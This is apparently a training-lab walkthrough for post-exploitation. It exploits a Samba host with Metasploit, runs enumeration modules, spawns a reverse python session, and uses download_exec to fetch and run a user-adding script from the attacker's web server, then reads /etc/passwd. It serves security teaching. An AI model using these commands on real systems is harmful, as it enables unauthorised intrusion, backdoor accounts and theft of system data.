# Post Exploitation Lab I

**Step 1:** Open the lab link to access the Kali machine.

<figure><img src="https://assets.ine.com/lab/learningpath/19aa1dd2fde3d308f58b14da42e4c5eae29482b6dc054170b1958291dc497b96.png" alt=""><figcaption></figcaption></figure>

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/8e39fd3894b0f585088b63e5e3e5b95fa143c295bbd5bd4b25feeaef8ba00512.png" alt=""><figcaption></figcaption></figure>

The target is reachable.

**Step 3:** Port scanning with Nmap

We can now perform a default Nmap port scan on the target to identify the open ports on the target system, this can be done by running the following command:

**Command:**

```
nmap -sS -sV -p- demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/6eda31d0cd560cbe5922ec872a65365e60f3f226f40782f7c449e873e7a78219.png" alt=""><figcaption></figcaption></figure>

**Step 4:** The target machine can be exploited by using exploit/linux/samba/is\_known\_pipename module.

**Command:**

```
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOST demo.ine.local
check
exploit -z
```

<figure><img src="https://assets.ine.com/lab/learningpath/6646a3480b892dffdb82de6e692427d59a81ed22ab1ec08632356e4ffef88dc7.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://assets.ine.com/lab/learningpath/ab8878834036e485613e75dc748d57057e46c6259936d6b2d823d20da6991910.png" alt=""><figcaption></figcaption></figure>

**Module 1:** post/linux/gather/enum\_configs

**Link:** https://www.rapid7.com/db/modules/post/linux/gather/enum\_configs

**Command:**

```
use post/linux/gather/enum_configs
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/81a93a1f510228c418ee6b335fbe8e1e0db1e072a3269dfd6dea81648a4abbe8.png" alt=""><figcaption></figcaption></figure>

**Module 2:** post/linux/gather/env

**Link:** https://www.rapid7.com/db/modules/post/linux/gather/env

**Command:**

```
use post/multi/gather/env
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/d45af4798b9067ea95b55f134a29efcf91ba45deba869edf9b92ffcc7981636b.png" alt=""><figcaption></figcaption></figure>

**Module 3:** post/linux/gather/enum\_network

**Link:** https://www.rapid7.com/db/modules/post/linux/gather/enum\_network

**Command:**

```
use post/linux/gather/enum_network
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/9e6dcd84030049514ae0ff67a4aa11e701a8776f5dd042deeaa2deb2218ee703.png" alt=""><figcaption></figcaption></figure>

**Module 4:** post/linux/gather/enum\_protections

**Link:** https://www.rapid7.com/db/modules/post/linux/gather/enum\_protections

**Command:**

```
use post/linux/gather/enum_protections
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/2a6524cca5f69ed1ca96532d6bd7e5481a6a800638223a812909642c848c1166.png" alt=""><figcaption></figcaption></figure>

**Module 5:** post/linux/gather/enum\_system

**Link:** https://www.rapid7.com/db/modules/post/linux/gather/enum\_system

**Command:**

```
use post/linux/gather/enum_system
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/dc13fd210982f1d7a294e8ba3a819db0a2ff84e5afd9c0ba5286ff3cd56adea7.png" alt=""><figcaption></figcaption></figure>

**Module 6:** post/linux/gather/checkcontainer

**Link:** https://www.rapid7.com/db/modules/post/linux/gather/checkcontainer

**Command:**

```
use post/linux/gather/checkcontainer
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/aceef6bccae4d03cd9bb4b8e44ef11d4bd27e56e8aff81e2ae57831c093be740.png" alt=""><figcaption></figcaption></figure>

**Module 7:** post/linux/gather/checkvm

**Link:** https://www.rapid7.com/db/modules/post/linux/gather/checkvm

**Command:**

```
use post/linux/gather/checkvm
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/cd7010836fb062d0cadcfdf32d169c74a16e288cf108460d42be7082b737f8fb.png" alt=""><figcaption></figcaption></figure>

**Module 8:** post/linux/gather/enum\_users\_history

**Link:** https://www.rapid7.com/db/modules/post/linux/gather/enum\_users\_history

**Command:**

```
use post/linux/gather/enum_users_history
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/22db49af5f16858ce89dbfe71718c56ed9ed098952ca9044f6f13b80b0494866.png" alt=""><figcaption></figcaption></figure>

**Module 9:** post/multi/manage/system\_session

**Link:** https://www.rapid7.com/db/modules/post/multi/manage/system\_session

**Command:**

```
use post/multi/manage/system_session
set SESSION 1
set TYPE python
set HANDLER true
set LHOST 192.216.221.2
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/21a15a94de3e28907b09fdf59d448d7688ba96e52d4684a8cf952c5653e5034d.png" alt=""><figcaption></figcaption></figure>

Now, let’s create a bash file which will create a user on the target machine by uploading a test.sh file and execute it.

**Command:**

```
useradd hacker
useradd test
useradd nick
```

Now, let’s run the Apache server on the attacker’s machine and copy the test.sh file in the root folder.

<figure><img src="https://assets.ine.com/lab/learningpath/a69626a710356baa73acfba3b7424f17f27bc80a084add51974110badac393d8.png" alt=""><figcaption></figcaption></figure>

**Command:**

```
/etc/init.d/apache2 start
cp test.sh /var/www/html
```

<figure><img src="https://assets.ine.com/lab/learningpath/e79e6731c231da6dfc9a0bb62220ee80e0990bf5b43fe0681959543263083b97.png" alt=""><figcaption></figcaption></figure>

Now, let’s use the download and exec post-exploitation module on the target machine.

**Module 10:** post/linux/manage/download\_exec

**Link:** https://www.rapid7.com/db/modules/post/linux/manage/download\_exec

**Command:**

```
use post/linux/manage/download_exec
set URL http://192.216.221.2/test.sh
set SESSION 1
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/701f82f151e9ea40adb1adc5d4aca64ae15f0faead49ec9feb643823f1e012c7.png" alt=""><figcaption></figcaption></figure>

Let’s verify it by interacting with the session.

**Command:**

```
sessions -i 1
cat /etc/passwd
```

<figure><img src="https://assets.ine.com/lab/learningpath/d014a59ed6634384aefab9177f5b4927daa00802b07f02c16df6aa38df07819d.png" alt=""><figcaption></figcaption></figure>
